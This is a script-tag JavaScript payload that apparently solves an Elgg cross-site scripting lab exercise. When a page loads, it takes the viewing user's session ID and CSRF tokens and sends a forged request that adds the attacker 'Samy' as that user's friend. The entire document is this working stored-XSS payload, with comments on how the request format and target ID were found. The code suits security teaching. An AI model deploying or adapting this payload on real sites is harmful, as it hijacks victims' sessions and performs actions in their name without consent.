<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	//found the current user's ID from elgg JSON data, from viewing page source
	var ownerID = elgg.session.user.guid;

	//found Samy's id 47 from the get request for adding him as a friend from other users.
	//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624191044&__elgg_token=2E6MOa8c4Qx9G8ukmlDPww&__elgg_ts=1624191044&__elgg_token=2E6MOa8c4Qx9G8ukmlDPww

	var samyID = 47;

	console.log(ownerID);
	console.log(samyID);

	
	//check to see if the current user is Samy himself.
	if(samyID != ownerID)
	{
		// var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend="+ samyID + ts +  token +  ts +  token; //FILL IN

		//adding a friend is of this format
		//smayID is the friend ID being added, token  and ts are of the current user.
		var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend="+ samyID + token + ts; //FILL IN

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
	
</script>
